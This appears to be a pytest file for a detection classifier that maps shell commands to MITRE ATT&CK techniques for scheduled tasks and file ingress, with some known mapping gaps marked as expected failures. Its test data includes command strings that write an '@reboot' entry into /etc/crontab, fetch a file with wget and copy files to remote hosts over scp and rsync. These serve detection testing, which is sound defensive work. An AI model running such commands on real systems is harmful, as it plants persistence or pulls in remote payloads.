"""Known command-mapping gaps in the current, hash-bound runtime policy."""

import pytest

from production.classification.classification_pipeline import NotebookParityClassifier
from production.classification.trust import is_trusted_classification_event


@pytest.mark.parametrize("command", [
    pytest.param("echo crontab > /tmp/note", marks=pytest.mark.xfail(strict=True, reason="reviewed T1053 policy release required")),
    "printf crontab > /tmp/note",
    pytest.param("echo crontab >> /var/log/demo", marks=pytest.mark.xfail(strict=True, reason="reviewed T1053 policy release required")),
    "echo crontab",
])
def test_crontab_mention_without_scheduling_target_is_not_trusted(command: str) -> None:
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=None)
    events = classifier.classify(command)
    assert not any(
        event.get("ttp") == "T1053" and is_trusted_classification_event(event)
        for event in events
    )


@pytest.mark.parametrize("command", [
    pytest.param("scp /tmp/a user@host:/tmp/a", marks=pytest.mark.xfail(strict=True, reason="reviewed T1105 policy release required")),
    pytest.param("scp user@host:/tmp/a other@host:/tmp/a", marks=pytest.mark.xfail(strict=True, reason="reviewed T1105 policy release required")),
    pytest.param("rsync /tmp/a user@host:/tmp/a", marks=pytest.mark.xfail(strict=True, reason="reviewed T1105 policy release required")),
    pytest.param("scp /tmp/a /tmp/b", marks=pytest.mark.xfail(strict=True, reason="reviewed T1105 policy release required")),
])
def test_outbound_scp_is_not_trusted_as_ingress_transfer(command: str) -> None:
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=None)
    events = classifier.classify(command)
    assert not any(
        event.get("ttp") == "T1105" and is_trusted_classification_event(event)
        for event in events
    )


@pytest.mark.parametrize("command,ttp", [
    ("echo '@reboot /tmp/a' >> /etc/crontab", "T1053"),
    ("scp user@host:/tmp/a /tmp/a", "T1105"),
    ("rsync user@host:/tmp/a /tmp/a", "T1105"),
    ("wget http://example.invalid/a -O /tmp/a", "T1105"),
])
def test_bound_schedule_and_ingress_examples_remain_trusted(command: str, ttp: str) -> None:
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=None)
    events = classifier.classify(command)
    assert any(
        event.get("ttp") == ttp and is_trusted_classification_event(event)
        for event in events
    )
